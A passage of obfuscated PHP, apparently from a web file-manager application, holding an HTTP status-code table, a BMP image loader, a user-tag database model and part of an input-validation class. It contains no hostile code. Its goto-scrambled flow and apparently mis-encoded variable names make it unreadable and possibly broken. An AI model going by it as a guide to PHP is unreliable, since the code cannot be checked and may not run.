"\123\167\x69\164\143\x68\x69\x6e\147\x20\x50\x72\157\x74\x6f\143\x6f\154", "\61\60\62" => "\x50\162\157\143\x65\163\x73\x69\156\147", "\x31\60\x33" => "\x45\x61\162\154\171\40\x48\x69\156\164\163", "\62\60\x30" => "\117\x4b", "\62\60\x31" => "\103\162\x65\x61\x74\145\x64", "\x32\x30\x32" => "\101\143\143\x65\x70\x74\145\x64", "\x32\x30\x33" => "\116\x6f\x6e\55\101\x75\x74\x68\157\162\x69\x74\141\164\x69\166\x65\x20\111\x6e\146\x6f\162\155\x61\x74\x69\x6f\x6e", "\x32\60\x34" => "\x4e\157\40\x43\157\156\x74\x65\x6e\x74", "\62\x30\65" => "\x52\x65\163\x65\164\x20\x43\157\156\164\145\x6e\164", "\62\60\x36" => "\120\x61\x72\x74\x69\x61\154\40\x43\157\156\164\145\x6e\x74", "\x32\x30\x37" => "\115\x75\x6c\x74\x69\55\x53\x74\141\x74\x75\163", "\x33\60\60" => "\x4d\x75\x6c\x74\x69\x70\154\x65\40\x43\x68\157\151\x63\145\x73", "\63\60\61" => "\x4d\x6f\166\145\x64\40\120\x65\x72\155\141\156\145\156\x74\x6c\171", "\63\60\62" => "\x46\x6f\165\x6e\x64", "\63\60\x33" => "\x53\145\145\40\x4f\x74\x68\145\x72", "\63\60\x34" => "\x4e\157\164\x20\115\x6f\144\151\x66\x69\145\144", "\63\60\65" => "\125\x73\145\x20\x50\x72\157\170\x79", "\63\x30\x37" => "\124\x65\x6d\160\x6f\x72\x61\162\x79\40\122\145\x64\x69\162\x65\143\x74", "\x33\60\x38" => "\x50\145\162\x6d\141\156\x65\156\x74\40\x52\x65\144\151\162\x65\x63\x74", "\x34\60\60" => "\102\141\x64\x20\x52\x65\x71\165\145\x73\x74", "\64\x30\x31" => "\x55\156\141\x75\x74\x68\157\x72\151\x7a\145\x64", "\x34\x30\62" => "\120\x61\171\x6d\x65\156\x74\40\x52\145\x71\x75\151\x72\x65\x64", "\64\60\63" => "\x46\x6f\162\142\151\144\144\x65\x6e", "\x34\60\x34" => "\x4e\157\164\x20\106\x6f\x75\156\x64", "\x34\60\x35" => "\115\x65\x74\x68\157\144\40\116\x6f\x74\x20\101\154\154\157\167\x65\144", "\x34\60\66" => "\116\157\164\40\101\143\x63\145\x70\164\x61\x62\154\145", "\64\x30\x37" => "\120\x72\x6f\170\171\x20\x41\x75\164\150\x65\x6e\x74\151\x63\x61\164\151\x6f\x6e\40\122\145\161\165\x69\162\x65\144", "\64\60\70" => "\122\x65\161\x75\145\x73\x74\40\x54\x69\155\x65\157\165\x74", "\64\x30\x39" => "\x43\157\x6e\146\x6c\x69\143\164", "\x34\61\x30" => "\107\157\156\145", "\x34\61\61" => "\114\145\x6e\x67\164\150\x20\x52\x65\x71\165\x69\x72\x65\x64", "\x34\x31\x32" => "\120\x72\x65\x63\x6f\156\x64\x69\x74\x69\x6f\156\40\106\x61\151\154\x65\144", "\64\61\63" => "\122\x65\161\165\x65\163\x74\40\105\x6e\164\x69\164\171\x20\124\157\x6f\x20\x4c\141\162\147\145", "\64\x31\64" => "\122\145\x71\165\x65\163\164\40\125\x52\x49\x20\124\x6f\157\40\114\141\162\x67\145", "\x34\61\x35" => "\x55\156\163\165\160\160\157\162\164\x65\x64\x20\x4d\x65\144\x69\141\x20\124\171\x70\x65", "\x34\61\66" => "\x52\145\161\165\145\163\164\145\144\40\122\141\156\x67\x65\40\116\x6f\x74\40\123\x61\x74\x69\x73\x66\x69\x61\x62\x6c\145", "\64\61\67" => "\x45\x78\x70\x65\143\164\141\164\x69\157\x6e\40\x46\x61\x69\154\x65\x64", "\64\62\x32" => "\125\156\x70\162\x6f\143\145\163\x73\x61\142\x6c\145\x20\105\156\x74\x69\x74\x79", "\x34\62\x33" => "\x4c\157\143\x6b\x65\144", "\64\x32\64" => "\106\141\151\x6c\x65\x64\x20\x44\145\x70\145\156\144\x65\156\x63\x79", "\64\x32\x35" => "\125\156\x6f\162\144\145\x72\x65\x64\40\103\157\x6c\x6c\x65\x63\164\151\157\x6e", "\x34\62\66" => "\125\x70\x67\162\141\144\x65\40\x52\x65\x71\165\x69\162\x65\x64", "\x34\62\70" => "\120\162\145\x63\157\156\x64\x69\164\151\x6f\156\x20\122\145\161\x75\x69\162\x65\x64", "\x34\62\x39" => "\124\157\x6f\40\115\x61\156\x79\x20\x52\x65\x71\x75\145\x73\x74\163", "\x34\x33\61" => "\x52\x65\x71\165\145\x73\164\x20\x48\x65\141\144\145\162\x20\106\151\x65\x6c\x64\163\40\124\x6f\x6f\40\114\x61\162\147\x65", "\64\64\64" => "\x4e\157\x20\x52\145\163\x70\x6f\156\x73\x65", "\64\65\x30" => "\102\x6c\x6f\x63\153\x65\144\40\142\x79\40\x57\151\156\x64\x6f\167\163\x20\x50\141\x72\x65\156\x74\x61\x6c\x20\103\x6f\x6e\x74\162\157\154\x73", "\x34\65\x31" => "\x55\x6e\x61\x76\x61\x69\154\141\x62\x6c\x65\x20\106\x6f\162\40\x4c\145\x67\141\x6c\40\x52\145\141\163\157\156\163", "\64\71\x34" => "\122\145\x71\x75\145\x73\x74\x20\x48\145\x61\x64\x65\162\40\124\157\157\40\114\141\162\x67\145", "\x35\60\60" => "\x49\156\x74\145\x72\156\141\154\x20\123\145\162\166\x65\162\x20\105\162\x72\x6f\162", "\x35\60\61" => "\116\157\164\x20\x49\x6d\160\154\x65\x6d\145\x6e\164\x65\x64", "\65\60\62" => "\102\x61\144\40\x47\x61\x74\x65\x77\x61\171", "\x35\x30\x33" => "\123\145\162\166\151\x63\145\x20\x55\x6e\141\x76\x61\x69\x6c\141\x62\x6c\x65", "\65\x30\64" => "\x47\141\x74\x65\x77\141\x79\40\x54\151\x6d\x65\157\x75\164", "\x35\60\65" => "\x48\x54\124\x50\x20\x56\x65\x72\163\151\157\156\x20\156\157\x74\40\x73\165\160\x70\157\162\x74\x65\144", "\x35\x30\x37" => "\111\156\163\x75\x66\x66\151\x63\151\x65\156\164\40\123\164\157\162\x61\x67\x65"); public static function code($a²ÏêÁïåš) { $AÙ±á”·éÒ =& $_SERVER[İë¬“ÅÒÛ›]; $a²ÏêÁïåš = $a²ÏêÁïåš . $AÙ±á”·éÒ[33]; $B¾¼¦‡– = self::$statusCode[$a²ÏêÁïåš]; $B¾¼¦‡– = $B¾¼¦‡– ? "\x48\124\x54\x50\x2f\x31\56\61\40{$a²ÏêÁïåš}\40" . $B¾¼¦‡– : $AÙ±á”·éÒ[33]; return $B¾¼¦‡–; } } class ImageGdBMP { public static function load($FÍÕĞñˆ) { $F¬³¦Œ‰Ìî = fopen($FÍÕĞñˆ, $_SERVER[İë¬“ÅÒÛ›][1167]); if ($F¬³¦Œ‰Ìî === !1) { return !1; } $A¯½—‚‡› = self::loadFromStream($F¬³¦Œ‰Ìî); fclose($F¬³¦Œ‰Ìî); return $A¯½—‚‡›; } public static function loadFromStream($döæ‚Ÿï¾ï) { $Fò¯˜ŞÏÆ =& $_SERVER[İë¬“ÅÒÛ›]; $D¤ÓÇ‡´ªÛ = fread($döæ‚Ÿï¾ï, 14); if ($D¤ÓÇ‡´ªÛ === !1) { return !1; } if ($D¤ÓÇ‡´ªÛ[0] != $Fò¯˜ŞÏÆ[1260] || $D¤ÓÇ‡´ªÛ[1] != $Fò¯˜ŞÏÆ[1261]) { return !1; } $a¼ŠÈã“®í = unpack($Fò¯˜ŞÏÆ[1262] . $Fò¯˜ŞÏÆ[1263] . $Fò¯˜ŞÏÆ[1264] . $Fò¯˜ŞÏÆ[1265] . $Fò¯˜ŞÏÆ[1266], $D¤ÓÇ‡´ªÛ); return self::loadFromStreamAndFileHeader($döæ‚Ÿï¾ï, $a¼ŠÈã“®í); } public static function loadFromStreamAndFileHeader($D¹‰²ã«Œ×, array $CÌ†ÍËµË„) { goto DÖ††·ãƒÎ; DÖ††·ãƒÎ: $f—·âí—Ùì =& $_SERVER[İë¬“ÅÒÛ›]; if ($CÌ†ÍËµË„[$f—·âí—Ùì[815]] != 19778) { return !1; } $cùŒÑ«Ô½„ = fread($D¹‰²ã«Œ×, 4); goto AËìÊã‘Š; AËìÊã‘Š: if ($cùŒÑ«Ô½„ === !1) { return !1; } list(, $Díº“ÉÁƒ) = unpack($f—·âí—Ùì[1267], $cùŒÑ«Ô½„); if ($Díº“ÉÁƒ == 12) { goto fÔÛÒ…ª¹¨; Ešğ¯äœ: $dÌ‡×„— = 255; goto B¥Á›Å£Øğ; fÔÛÒ…ª¹¨: $cùŒÑ«Ô½„ = fread($D¹‰²ã«Œ×, $Díº“ÉÁƒ - 4); if ($cùŒÑ«Ô½„ === !1) { return !1; } extract(unpack($f—·âí—Ùì[1268] . $f—·âí—Ùì[1269] . $f—·âí—Ùì[1270] . $f—·âí—Ùì[1271], $cùŒÑ«Ô½„)); goto B³‹•ŒÏò; B³‹•ŒÏò: $DççùÎœ = $BÑˆŞå¢¾„ = $cÂ¤ö°†ˆë = $F¡ÙÖ÷¬ˆ’ = 0; $BÚò¤¿Œš£ = 16711680; $Cé£Éê‘× = 65280; goto Ešğ¯äœ; B¥Á›Å£Øğ: } else { if (124 < $Díº“ÉÁƒ || $Díº“ÉÁƒ < 40) { return !1; } else { goto aĞ¯ÒƒÜ‘è; f˜ğÈ³Ôí·: if ($DÚ¾Ğ†Å & 2147483648) { $DÚ¾Ğ†Å = -(~$DÚ¾Ğ†Å & 4294967295) - 1; } if ($CÌ†ÍËµË„[$f—·âí—Ùì[392]] != 0) { $b§ù¬îÍ  = $DŞôëí¡ == 1 || $DŞôëí¡ == 4 || $DŞôëí¡ == 8 ? ($DççùÎœ ? $DççùÎœ : pow(2, $DŞôëí¡)) << 2 : 0; $E™˜øŒ„¶¬ = $cÜô„à™Á ? $cÜô„à™Á : ($D†ó¸†Œƒè * $DŞôëí¡ + 31 >> 3 & ~3) * abs($cÄÉÒ¼›Ğ); $DŒÇç—¤¯ƒ = $CÌ†ÍËµË„[$f—·âí—Ùì[392]] - $E™˜øŒ„¶¬ - $b§ù¬îÍ  - 14; if ($Díº“ÉÁƒ < $DŒÇç—¤¯ƒ && 40 <= $Díº“ÉÁƒ && $Díº“ÉÁƒ <= 124) { $Díº“ÉÁƒ = $DŒÇç—¤¯ƒ; } } if ($Díº“ÉÁƒ - 40 > 0) { $cùŒÑ«Ô½„ = fread($D¹‰²ã«Œ×, $Díº“ÉÁƒ - 40); if ($cùŒÑ«Ô½„ === !1) { return !1; } extract(unpack($f—·âí—Ùì[1281] . $f—·âí—Ùì[1282] . $f—·âí—Ùì[1283] . $f—·âí—Ùì[1284], $cùŒÑ«Ô½„ . str_repeat($f—·âí—Ùì[1285], 120))); } else { $cÂ¤ö°†ˆë = $BÚò¤¿Œš£ = $Cé£Éê‘× = $dÌ‡×„— = 0; } goto c½šÔÉ§ø; c½šÔÉ§ø: if (($DŞôëí¡ == 16 || $DŞôëí¡ == 24 || $DŞôëí¡ == 32) && $F¡ÙÖ÷¬ˆ’ == 0 && $BÚò¤¿Œš£ == 0 && $Cé£Éê‘× == 0 && $dÌ‡×„— == 0) { switch ($DŞôëí¡) { case 16: $BÚò¤¿Œš£ = 31744; $Cé£Éê‘× = 992; $dÌ‡×„— = 31; break; case 24: case 32: $BÚò¤¿Œš£ = 16711680; $Cé£Éê‘× = 65280; $dÌ‡×„— = 255; break; } } goto BéŞÙ¶±Š; aĞ¯ÒƒÜ‘è: $cùŒÑ«Ô½„ = fread($D¹‰²ã«Œ×, 36); if ($cùŒÑ«Ô½„ === !1) { return !1; } extract(unpack($f—·âí—Ùì[1272] . $f—·âí—Ùì[1273] . $f—·âí—Ùì[1270] . $f—·âí—Ùì[1274] . $f—·âí—Ùì[1275] . $f—·âí—Ùì[1276] . $f—·âí—Ùì[1277] . $f—·âí—Ùì[1278] . $f—·âí—Ùì[1279] . $f—·âí—Ùì[1280], $cùŒÑ«Ô½„)); goto D°¶ƒ¸†Ş; D°¶ƒ¸†Ş: if ($D†ó¸†Œƒè & 2147483648) { $D†ó¸†Œƒè = -(~$D†ó¸†Œƒè & 4294967295) - 1; } if ($cÄÉÒ¼›Ğ & 2147483648) { $cÄÉÒ¼›Ğ = -(~$cÄÉÒ¼›Ğ & 4294967295) - 1; } if ($aˆí³â¦á & 2147483648) { $aˆí³â¦á = -(~$aˆí³â¦á & 4294967295) - 1; } goto f˜ğÈ³Ôí·; BéŞÙ¶±Š: } } goto Eäë…ÖŸòò; BñİÀÑÛè: $a£¥“÷˜òå = abs($cÄÉÒ¼›Ğ); $CÏ÷Œî = $cÄÉÒ¼›Ğ > 0 ? $a£¥“÷˜òå - 1 : 0; $C‘Øƒ‚—¸Ò = $cÄÉÒ¼›Ğ > 0 ? -1 : 1; goto BˆÄÖí¸˜; BˆÄÖí¸˜: if ($DŞôëí¡ == 1 || $DŞôëí¡ == 4 || $DŞôëí¡ == 8) { goto BĞÄ±ª×¬¡; e®Ş‰˜Ûšö: $d¼šÅš½£Ü = (1 << $DŞôëí¡) - 1 << $cê¹Á¯ãæ¿; if ($F¡ÙÖ÷¬ˆ’ == 1 || $F¡ÙÖ÷¬ˆ’ == 2) { $Aà‘³íöè = 0; $dÉµÕÄ‰Õİ = $DŞôëí¡ >> 2 & 1; for (;;) { if ($Aà‘³íöè < -1 || $Aà‘³íöè > $D†ó¸†Œƒè || $CÏ÷Œî < -1 || $CÏ÷Œî > $cÄÉÒ¼›Ğ) { imagedestroy($A—òˆ‘Š÷‹); return !1; } $cùŒÑ«Ô½„ = fread($D¹‰²ã«Œ×, 1); if ($cùŒÑ«Ô½„ === !1) { imagedestroy($A—òˆ‘Š÷‹); return !1; } switch ($cùŒÑ«Ô½„) { case $f—·âí—Ùì[1285]: $cùŒÑ«Ô½„ = fread($D¹‰²ã«Œ×, 1); if ($cùŒÑ«Ô½„ === !1) { imagedestroy($A—òˆ‘Š÷‹); return !1; } switch ($cùŒÑ«Ô½„) { case $f—·âí—Ùì[1285]: $CÏ÷Œî += $C‘Øƒ‚—¸Ò; $Aà‘³íöè = 0; break; case $f—·âí—Ùì[1287]: $CÏ÷Œî = 0; $Aà‘³íöè = 0; break 3; case $f—·âí—Ùì[1288]: $cùŒÑ«Ô½„ = fread($D¹‰²ã«Œ×, 2); if ($cùŒÑ«Ô½„ === !1) { imagedestroy($A—òˆ‘Š÷‹); return !1; } list(, $Dòô¡§è†Ú, $eï‰¤¯­) = unpack($f—·âí—Ùì[1289], $cùŒÑ«Ô½„); $Aà‘³íöè += $Dòô¡§è†Ú; $CÏ÷Œî += $eï‰¤¯­ * $C‘Øƒ‚—¸Ò; break; default: list(, $dÄ˜Ú Îñµ) = unpack($f—·âí—Ùì[1290], $cùŒÑ«Ô½„); $fƒ±í¸ˆÙ = ($dÄ˜Ú Îñµ >> $dÉµÕÄ‰Õİ) + ($dÄ˜Ú Îñµ & $dÉµÕÄ‰Õİ); $cùŒÑ«Ô½„ = fread($D¹‰²ã«Œ×, $fƒ±í¸ˆÙ + 1 & ~1); if ($cùŒÑ«Ô½„ === !1) { imagedestroy($A—òˆ‘Š÷‹); return !1; } for ($d«ßí¨í¦ñ = 0, $fè‰äÊÏ‹‚ = 0; $d«ßí¨í¦ñ < $dÄ˜Ú Îñµ; ++$d«ßí¨í¦ñ, ++$Aà‘³íöè, $fè‰äÊÏ‹‚ += $DŞôëí¡) { list(, $d°Ëº…šÂ“) = unpack($f—·âí—Ùì[1290], $cùŒÑ«Ô½„[$fè‰äÊÏ‹‚ >> 3]); $a¡ƒ¾ÏŒÍ = $fè‰äÊÏ‹‚ & 7; imagesetpixel($A—òˆ‘Š÷‹, $Aà‘³íöè, $CÏ÷Œî, $fâĞµùë‹¾[($d°Ëº…šÂ“ & $d¼šÅš½£Ü >> $a¡ƒ¾ÏŒÍ) >> $cê¹Á¯ãæ¿ - $a¡ƒ¾ÏŒÍ]); } break; } break; default: $f¿Á…†ğÛ = fread($D¹‰²ã«Œ×, 1); if ($f¿Á…†ğÛ === !1) { imagedestroy($A—òˆ‘Š÷‹); return !1; } list(, $aº¡äƒ§İé, $d°Ëº…šÂ“) = unpack($f—·âí—Ùì[1289], $cùŒÑ«Ô½„ . $f¿Á…†ğÛ); for ($d«ßí¨í¦ñ = 0, $fè‰äÊÏ‹‚ = 0; $d«ßí¨í¦ñ < $aº¡äƒ§İé; ++$d«ßí¨í¦ñ, ++$Aà‘³íöè, $fè‰äÊÏ‹‚ += $DŞôëí¡) { $a¡ƒ¾ÏŒÍ = $fè‰äÊÏ‹‚ & 7; imagesetpixel($A—òˆ‘Š÷‹, $Aà‘³íöè, $CÏ÷Œî, $fâĞµùë‹¾[($d°Ëº…šÂ“ & $d¼šÅš½£Ü >> $a¡ƒ¾ÏŒÍ) >> $cê¹Á¯ãæ¿ - $a¡ƒ¾ÏŒÍ]); } break; } } } else { for ($cİİ“îÊ¸ = 0; $cİİ“îÊ¸ < $a£¥“÷˜òå; ++$cİİ“îÊ¸, $CÏ÷Œî += $C‘Øƒ‚—¸Ò) { $cùŒÑ«Ô½„ = fread($D¹‰²ã«Œ×, $DËƒó³¾‹ç); if ($cùŒÑ«Ô½„ === !1) { imagedestroy($A—òˆ‘Š÷‹); return !1; } $fè‰äÊÏ‹‚ = 0; for ($Aà‘³íöè = 0; $Aà‘³íöè < $D†ó¸†Œƒè; ++$Aà‘³íöè, $fè‰äÊÏ‹‚ += $DŞôëí¡) { list(, $d°Ëº…šÂ“) = unpack($f—·âí—Ùì[1290], $cùŒÑ«Ô½„[$fè‰äÊÏ‹‚ >> 3]); $a¡ƒ¾ÏŒÍ = $fè‰äÊÏ‹‚ & 7; imagesetpixel($A—òˆ‘Š÷‹, $Aà‘³íöè, $CÏ÷Œî, $fâĞµùë‹¾[($d°Ëº…šÂ“ & $d¼šÅš½£Ü >> $a¡ƒ¾ÏŒÍ) >> $cê¹Á¯ãæ¿ - $a¡ƒ¾ÏŒÍ]); } } } goto a¦ï›Ş·ª; aÏèßø›‚: $fâĞµùë‹¾ = array(); for ($d«ßí¨í¦ñ = 0; $d«ßí¨í¦ñ < $CŠ ºœêÍ£; ++$d«ßí¨í¦ñ) { $cùŒÑ«Ô½„ = fread($D¹‰²ã«Œ×, $béí´áÌòì); if ($cùŒÑ«Ô½„ === !1) { imagedestroy($A—òˆ‘Š÷‹); return !1; } extract(unpack($f—·âí—Ùì[1286], $cùŒÑ«Ô½„ . $f—·âí—Ùì[1285])); $fâĞµùë‹¾[] = imagecolorallocate($A—òˆ‘Š÷‹, $Bè—àÜµÉÑ, $a×¨ÏÏ°¼È, $a¡ƒ¾ÏŒÍ); } $cê¹Á¯ãæ¿ = 8 - $DŞôëí¡; goto e®Ş‰˜Ûšö; BĞÄ±ª×¬¡: $A—òˆ‘Š÷‹ = imagecreate($D†ó¸†Œƒè, $a£¥“÷˜òå); $béí´áÌòì = $Díº“ÉÁƒ == 12 ? 3 : 4; $CŠ ºœêÍ£ = $DççùÎœ ? $DççùÎœ : pow(2, $DŞôëí¡); goto aÏèßø›‚; a¦ï›Ş·ª: } else { goto E àÜæá™“; d²çÙÙÍ‡Ñ: $F¶áäõÜ = $BÚò¤¿Œš£ ? 1 / $BÚò¤¿Œš£ : 1; $AŞšøÔøÓĞ = $Cé£Éê‘× ? 1 / $Cé£Éê‘× : 1; $Bñ“¾«™ã = $dÌ‡×„— ? 1 / $dÌ‡×„— : 1; goto E®‹®²õ¸; aªÃñ¼İ¼Ö: $BÃ›¹È²ÀÁ = $DŞôëí¡ >> 3; $b†ÀÊòÌ”Ş = $cÂ¤ö°†ˆë ? 127 : 0; $CÄ†³®¶Ï = $cÂ¤ö°†ˆë ? 1 / $cÂ¤ö°†ˆë : 1; goto d²çÙÙÍ‡Ñ; E àÜæá™“: $A—òˆ‘Š÷‹ = imagecreatetruecolor($D†ó¸†Œƒè, $a£¥“÷˜òå); imagealphablending($A—òˆ‘Š÷‹, !1); if ($cÂ¤ö°†ˆë) { imagesavealpha($A—òˆ‘Š÷‹, !0); } goto aªÃñ¼İ¼Ö; E®‹®²õ¸: for ($cİİ“îÊ¸ = 0; $cİİ“îÊ¸ < $a£¥“÷˜òå; ++$cİİ“îÊ¸, $CÏ÷Œî += $C‘Øƒ‚—¸Ò) { $cùŒÑ«Ô½„ = fread($D¹‰²ã«Œ×, $DËƒó³¾‹ç); if ($cùŒÑ«Ô½„ === !1) { imagedestroy($A—òˆ‘Š÷‹); return !1; } $fè‰äÊÏ‹‚ = 0; for ($Aà‘³íöè = 0; $Aà‘³íöè < $D†ó¸†Œƒè; ++$Aà‘³íöè, $fè‰äÊÏ‹‚ += $BÃ›¹È²ÀÁ) { list(, $d°Ëº…šÂ“) = unpack($f—·âí—Ùì[1267], substr($cùŒÑ«Ô½„, $fè‰äÊÏ‹‚, $BÃ›¹È²ÀÁ) . $f—·âí—Ùì[1291]); $b—Œ½Ç·ÔĞ = $d°Ëº…šÂ“ & $cÂ¤ö°†ˆë; $b­ğåæ¼ß = $d°Ëº…šÂ“ & $BÚò¤¿Œš£; $FºëË²šØÔ = $d°Ëº…šÂ“ & $Cé£Éê‘×; $dñ–Œ¿å½˜ = $d°Ëº…šÂ“ & $dÌ‡×„—; $cí³ò½ºÀ = $b†ÀÊòÌ”Ş - (($b—Œ½Ç·ÔĞ << 7) - $b—Œ½Ç·ÔĞ) * $CÄ†³®¶Ï; $Bè—àÜµÉÑ = (($b­ğåæ¼ß << 8) - $b­ğåæ¼ß) * $F¶áäõÜ; $a×¨ÏÏ°¼È = (($FºëË²šØÔ << 8) - $FºëË²šØÔ) * $AŞšøÔøÓĞ; $a¡ƒ¾ÏŒÍ = (($dñ–Œ¿å½˜ << 8) - $dñ–Œ¿å½˜) * $Bñ“¾«™ã; imagesetpixel($A—òˆ‘Š÷‹, $Aà‘³íöè, $CÏ÷Œî, $cí³ò½ºÀ << 24 | $Bè—àÜµÉÑ << 16 | $a×¨ÏÏ°¼È << 8 | $a¡ƒ¾ÏŒÍ); } } imagealphablending($A—òˆ‘Š÷‹, !0); goto fÀ¾Åœ»‚; fÀ¾Åœ»‚: } return $A—òˆ‘Š÷‹; goto dÇ¢éëË‹…; Eäë…ÖŸòò: if ($D†ó¸†Œƒè == 0 || $cÄÉÒ¼›Ğ == 0 || $cÖ„¬íÏôä != 1 || ($cÂ¤ö°†ˆë & $BÚò¤¿Œš£) != 0 || ($cÂ¤ö°†ˆë & $Cé£Éê‘×) != 0 || ($cÂ¤ö°†ˆë & $dÌ‡×„—) != 0 || ($BÚò¤¿Œš£ & $Cé£Éê‘×) != 0 || ($BÚò¤¿Œš£ & $dÌ‡×„—) != 0 || ($Cé£Éê‘× & $dÌ‡×„—) != 0) { return !1; } if ($F¡ÙÖ÷¬ˆ’ == 4 || $F¡ÙÖ÷¬ˆ’ == 5) { $cùŒÑ«Ô½„ = stream_get_contents($D¹‰²ã«Œ×, $cÜô„à™Á); if ($cùŒÑ«Ô½„ === !1) { return !1; } return imagecreatefromstring($cùŒÑ«Ô½„); } $DËƒó³¾‹ç = $D†ó¸†Œƒè * $DŞôëí¡ + 31 >> 3 & ~3; goto BñİÀÑÛè; dÇ¢éëË‹…: } } goto BÂÆ‘ÊƒÛÑ; FçÜĞğ–Î‰: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\x5f\146\141\x76"; protected function cacheFunctionAlias($d¨º÷¼À‹ä) { $C‚ìİ†š =& $_SERVER[İë¬“ÅÒÛ›]; return array($C‚ìİ†š[1908] => array(USER_ID, $C‚ìİ†š[1973])); } protected function listData() { $BÌ…ÒßÑ¥¸ =& $_SERVER[İë¬“ÅÒÛ›]; $EÉâŠŠˆó = array($BÌ…ÒßÑ¥¸[1086] => USER_ID, $BÌ…ÒßÑ¥¸[1910] => array($BÌ…ÒßÑ¥¸[1974], 0)); $F·ø½ÍåŞ¼ = $BÌ…ÒßÑ¥¸[1975]; $b…¤’õ‹„ = $BÌ…ÒßÑ¥¸[1976]; $AÊŒàõ¤öï = $this->field($F·ø½ÍåŞ¼)->where($EÉâŠŠˆó)->order($b…¤’õ‹„)->select(); return $AÊŒàõ¤öï ? $AÊŒàõ¤öï : array(); } protected function listByTag($cÌ²Öö‡õœ) { } protected function addToTag($DÓñÀ…ñºó, $AÄè¢—›ğ£) { $D»–Ä“»„Ò =& $_SERVER[İë¬“ÅÒÛ›]; if (!Model($D»–Ä“»„Ò[1745])->listData($AÄè¢—›ğ£) || !Model($D»–Ä“»„Ò[522])->pathInfo($DÓñÀ…ñºó)) { return !1; } $Aæ†ˆ‘ô±Ÿ = array($D»–Ä“»„Ò[1086] => USER_ID, $D»–Ä“»„Ò[1910] => $AÄè¢—›ğ£, $D»–Ä“»„Ò[1608] => $DÓñÀ…ñºó, $D»–Ä“»„Ò[815] => $D»–Ä“»„Ò[986], $D»–Ä“»„Ò[388] => $D»–Ä“»„Ò[33], $D»–Ä“»„Ò[1550] => 0); if ($this->where($Aæ†ˆ‘ô±Ÿ)->find()) { return !1; } return $this->add($Aæ†ˆ‘ô±Ÿ); } protected function removeFromTag($a‚®‰÷ê²º, $f‚§ì·¥É¹) { $BœÜ¯ñ­„ó =& $_SERVER[İë¬“ÅÒÛ›]; if (!Model($BœÜ¯ñ­„ó[1745])->listData($f‚§ì·¥É¹) || !Model($BœÜ¯ñ­„ó[522])->pathInfo($a‚®‰÷ê²º)) { return !1; } $a÷ë®êÈò = array($BœÜ¯ñ­„ó[1086] => USER_ID, $BœÜ¯ñ­„ó[1910] => $f‚§ì·¥É¹, $BœÜ¯ñ­„ó[815] => $BœÜ¯ñ­„ó[986], $BœÜ¯ñ­„ó[1608] => $a‚®‰÷ê²º); return $this->where($a÷ë®êÈò)->delete(); } protected function removeByTag($Eö—‰É’ÂÙ) { $EêöË‡¸šé =& $_SERVER[İë¬“ÅÒÛ›]; if (!$Eö—‰É’ÂÙ) { return !1; } $AŞ¢óˆ©¾ó = array($EêöË‡¸šé[1086] => USER_ID, $EêöË‡¸šé[1910] => $Eö—‰É’ÂÙ); return $this->where($AŞ¢óˆ©¾ó)->delete(); } protected function removeBySource($e‚Ö ŒÔ­) { $ağºƒ¦ŒªÙ =& $_SERVER[İë¬“ÅÒÛ›]; $C¬ö‘åÉ±÷ = array($ağºƒ¦ŒªÙ[1086] => USER_ID, $ağºƒ¦ŒªÙ[1608] => $e‚Ö ŒÔ­, $ağºƒ¦ŒªÙ[1910] => array($ağºƒ¦ŒªÙ[698], 0)); return $this->where($C¬ö‘åÉ±÷)->delete(); } } goto a¡Š¡ó‚Æî; Aùî‰‹ : class Input { public static function getArray($FîÓïİ‚•Ù) { goto b¹§ã®œø„; BˆŸëóª£ï: if (count($Eù¤‰ÁÖĞõ) > 0) { show_json(implode($cèÖËãŠƒô[1308], $Eù¤‰ÁÖĞõ), !1); } return $AÉ¥Í¼µÏğ; goto Dºì¬´ùİ‘; b¹§ã®œø„: $cèÖËãŠƒô =& $_SERVER[İë¬“ÅÒÛ›]; global $in; $AÉ¥Í¼µÏğ = array(); goto Bê‹çáãµè; Bê‹çáãµè: $Eù¤‰ÁÖĞõ = array(); $b´Ó‰¶ÑË£ = LNG($cèÖËãŠƒô[1303]); foreach ($FîÓïİ‚•Ù as $CÜ·¨§¥‘é => $eº³æÅ¦Ôõ) { goto eí¤…ìğ±‰; d†¾¦Ú´ªø: if (!array_key_exists($CÜ·¨§¥‘é, $in)) { if (array_key_exists($cèÖËãŠƒô[1306], $eº³æÅ¦Ôõ)) { if (!is_null($eº³æÅ¦Ôõ[$cèÖËãŠƒô[1306]])) { $AÉ¥Í¼µÏğ[$F‰¬ÙŠàİ] = $eº³æÅ¦Ôõ[$cèÖËãŠƒô[1306]]; } } else { if (isset($eº³æÅ¦Ôõ[$cèÖËãŠƒô[1307]])) { $Eù¤‰ÁÖĞõ[] = $B©Ïá–œ§Õ; } } continue; } if (isset($eº³æÅ¦Ôõ[$cèÖËãŠƒô[1307]]) && $eº³æÅ¦Ôõ[$cèÖËãŠƒô[1307]] == $cèÖËãŠƒô[286]) { $dáğÅŠ“ö = json_decode($in[$CÜ·¨§¥‘é], !0); if (is_array($dáğÅŠ“ö)) { $AÉ¥Í¼µÏğ[$F‰¬ÙŠàİ] = $dáğÅŠ“ö; } else { if (array_key_exists($cèÖËãŠƒô[1306], $eº³æÅ¦Ôõ)) { if (!is_null($eº³æÅ¦Ôõ[$cèÖËãŠƒô[1306]])) { $AÉ¥Í¼µÏğ[$F‰¬ÙŠàİ] = $eº³æÅ¦Ôõ[$cèÖËãŠƒô[1306]]; } } else { $Eù¤‰ÁÖĞõ[] = $B©Ïá–œ§Õ; } } continue; } $e²ù¯Ó–É = _get($eº³æÅ¦Ôõ, $cèÖËãŠƒô[760]); goto F¼‚µ”Ó×; eí¤…ìğ±‰: $B©Ïá–œ§Õ = _get($eº³æÅ¦Ôõ, $cèÖËãŠƒô[1304], $b´Ó‰¶ÑË£ . $cèÖËãŠƒô[650] . $CÜ·¨§¥‘é); $F‰¬ÙŠàİ = $CÜ·¨§¥‘é; if (isset($eº³æÅ¦Ôõ[$cèÖËãŠƒô[1305]]) && $eº³æÅ¦Ôõ[$cèÖËãŠƒô[1305]]) { $F‰¬ÙŠàİ = $eº³æÅ¦Ôõ[$cèÖËãŠƒô[1305]]; } goto d†¾¦Ú´ªø; F¼‚µ”Ó×: if (isset($eº³æÅ¦Ôõ[$cèÖËãŠƒô[1307]]) && !self::check($in[$CÜ·¨§¥‘é], $eº³æÅ¦Ôõ[$cèÖËãŠƒô[1307]], $e²ù¯Ó–É)) { if (array_key_exists($cèÖËãŠƒô[1306], $eº³æÅ¦Ôõ)) { if (!is_null($eº³æÅ¦Ôõ[$cèÖËãŠƒô[1306]])) { 